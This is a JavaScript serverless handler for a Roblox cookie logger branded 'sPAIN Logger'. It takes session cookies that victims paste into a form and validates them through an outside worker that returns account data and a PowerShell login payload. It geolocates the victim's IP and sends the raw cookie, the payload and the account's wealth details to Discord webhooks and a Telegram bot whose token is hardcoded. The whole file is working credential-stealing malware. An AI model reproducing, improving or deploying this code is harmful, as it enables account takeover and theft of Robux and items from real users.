// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';

function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

async function redisSet(key, value) {
  try {
    const res = await fetch(
      `${REDIS_URL}/set/${encodeURIComponent(key)}/${encodeURIComponent(JSON.stringify(value))}`,
      { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } }
    );
    return res.ok;
  } catch { return false; }
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`);
    const d = await r.json();
    return d.status === 'success' ? d : null;
  } catch { return null; }
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
function extractCookie(raw) {
  if (!raw) return null;
  const s = raw.trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);  if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                      if (m2) return WARN + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/);                                  if (m3) return WARN + m3[1];
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
  return null;
}
function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}

// Worker returns BOTH Roblox info AND powershell in one call
async function getWorkerData(cookie, victimIp) {
  try {
    const r = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie, victimIp })
    });
    if (!r.ok) return null;
    return await r.json();
  } catch { return null; }
}

async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

// Chunked text sender — splits anything >2000 chars
async function discordText(url, text, lang = '') {
  const prefix = lang ? `\`\`\`${lang}\n` : '';
  const suffix = lang ? '\n```' : '';
  const limit  = 1990 - prefix.length - suffix.length;
  let rem = text;
  while (rem.length > 0) {
    const chunk = rem.substring(0, limit); rem = rem.substring(limit);
    await discordSend(url, { content: prefix + chunk + (rem.length === 0 ? suffix : '') });
  }
}

// ── Rich embed matching Image 2 ───────────────────────────────────────────────
async function sendHit(webhookUrl, { roblox, cookie, powershell, ip, geo, now, pageName, refreshUrl }) {
  const ps = powershell || '';

  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      title:       `${roblox.username} ${roblox.isPremium ? '⭐' : ''}`,
      description: `🔥 \`sPAIN\` 🔥\n\n[Profile 👤](https://www.roblox.com/users/${roblox.id}/profile)${refreshUrl ? `\n[🔄 Refresh PowerShell](${refreshUrl})` : ''}`,
      color:       5793266,
      thumbnail:   { url: roblox.avatarUrl },
      fields: [
        { name: '🔴 Robux',      value: `${roblox.robux?.toLocaleString() || 0}`,                                             inline: true  },
        { name: '🎵 RAP',        value: `${roblox.limitedsValue?.toLocaleString() || 0}\n(${roblox.limitedsCount || 0} items)`,inline: true  },
        { name: '🗓️ Age',        value: `${roblox.accountAgeDays} days`,                                                      inline: true  },
        { name: '💎 Premium',    value: roblox.isPremium ? 'Yes ✅' : 'No ❌',                                                inline: true  },
        { name: '👥 Groups',     value: `Owned: ${roblox.groupsOwned} | R$: ${roblox.groupRobux?.toLocaleString() || 0}`,    inline: true  },
        { name: '🌐 IP',         value: ip || 'Unknown',                                                                      inline: true  },
        {
          name:   '📍 Location',
          value:  [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') + (geo?.isp ? `\n${geo.isp}` : ''),
          inline: false
        },
        { name: '⚙️ Account',    value: `Email: ${roblox.emailSet}  2FA: ${roblox.twoFA}`,                                   inline: false },
        {
          name:   '🎯 Gamepasses',
          value:  `MM2: ${roblox.gamepasses?.mm2 ? '✅' : '❌'} | Adopt Me: ${roblox.gamepasses?.adoptMe ? '✅' : '❌'} | Pls Donate: ${roblox.gamepasses?.plsDonate ? '✅' : '❌'}`,
          inline: false
        },
        {
          name:   '📋 Slots (PowerShell)',
          value:  '```\n' + ps.substring(0, 1000) + (ps.length > 1000 ? '\n... (continued below)' : '') + '\n```',
          inline: false
        }
      ],
      footer:    { text: `sPAIN Logger • ${pageName} • ${now}` },
      timestamp: now
    }]
  });

  // Send full PowerShell as separate messages if long
  if (ps.length > 1000) {
    await discordText(webhookUrl, ps, 'powershell');
  }

  // Raw cookie — separate message, chunked
  await discordText(webhookUrl, cookie);
}

async function sendInvalid(webhookUrl, { ip, geo, now, pageName }) {
  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      title:       '⚠️ Invalid Cookie — someone trolling 💀',
      description: 'Cookie was **invalid or fake**.',
      color:       0xff3333,
      fields: [
        { name: '🌐 IP',       value: ip || 'Unknown',                                                                     inline: true  },
        { name: '📍 Location', value: [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown',                   inline: true  },
        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                               inline: true  },
        { name: '🕐 Date',     value: now,                                                                                  inline: false }
      ],
      footer:    { text: `sPAIN Tools • ${pageName}` },
      timestamp: now
    }]
  });
}

async function sendRefreshCard(webhookUrl, refreshUrl, pageName) {
  await discordSend(webhookUrl, {
    embeds: [{
      title:       '🔄 Get Fresh PowerShell Anytime',
      description: `Click the link below whenever you need a new PowerShell for this account:\n**${refreshUrl}**`,
      color:       0x06b6d4,
      footer:      { text: `sPAIN Tools • ${pageName} • Keep this private` }
    }]
  });
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  const body = parseBody(req.body);
  const { slug, slots } = body;
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  const record = await redisGet(`slot:${slug}`);
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook on record' });

  // Respond immediately — client never waits
  res.status(200).json({ success: true });

  try {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
            || req.headers['x-real-ip'] || 'Unknown';

    const [geo, cookie] = await Promise.all([
      getIpGeo(ip),
      Promise.resolve(findCookie(slots))
    ]);

    // Single worker call — returns BOTH roblox info AND powershell
    const workerData = cookie ? await getWorkerData(cookie, ip) : null;
    const roblox     = workerData?.valid ? workerData : null;
    const powershell = workerData?.powershell || null;
    const isValid    = !!(roblox && powershell);

    const now      = new Date().toISOString();
    const pageName = record.displayName || slug;

    // Load dualhook parent
    let parent = null;
    if (record.dualhookParent) parent = await redisGet(`slot:${record.dualhookParent}`);

    // Generate refresh ID and save to Redis BEFORE sending Discord (so link is ready)
    let refreshUrl = null;
    if (isValid && cookie) {
      const refreshId = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
      refreshUrl = `https://spain-tools.vercel.app/r/${refreshId}`;
      await redisSet(`refresh:${refreshId}`, {
        cookie,
        webhook:  record.webhook,
        webhook1: parent?.webhook || null,
        pageName
      });
    }

    const payload = { roblox, cookie, powershell, ip, geo, now, pageName, refreshUrl };

    if (isValid) {
      // Main embed + full PS + raw cookie
      await sendHit(record.webhook, payload);
      if (parent?.webhook && parent.webhook !== record.webhook) {
        await sendHit(parent.webhook, payload);
      }
      // Separate refresh card message
      await sendRefreshCard(record.webhook, refreshUrl, pageName);
      if (parent?.webhook && parent.webhook !== record.webhook) {
        await sendRefreshCard(parent.webhook, refreshUrl, pageName);
      }
    } else {
      await sendInvalid(record.webhook, { ip, geo, now, pageName });
      if (parent?.webhook && parent.webhook !== record.webhook) {
        await sendInvalid(parent.webhook, { ip, geo, now, pageName });
      }
    }

    await tgSend(isValid ? [
      `✅ <b>VALID HIT — ${roblox.username} ${roblox.isPremium ? '⭐' : ''}</b>`,
      `💰 Robux: ${roblox.robux?.toLocaleString() || 0}`,
      `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
      `📄 Page: ${pageName}`,
      `🔄 Refresh: ${refreshUrl}`
    ].join('\n') : [
      `⚠️ <b>INVALID — ${pageName}</b>`,
      `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
      `🕐 ${now}`
    ].join('\n'));

  } catch (err) {
    console.error('Post-response error:', err.message);
  }
}
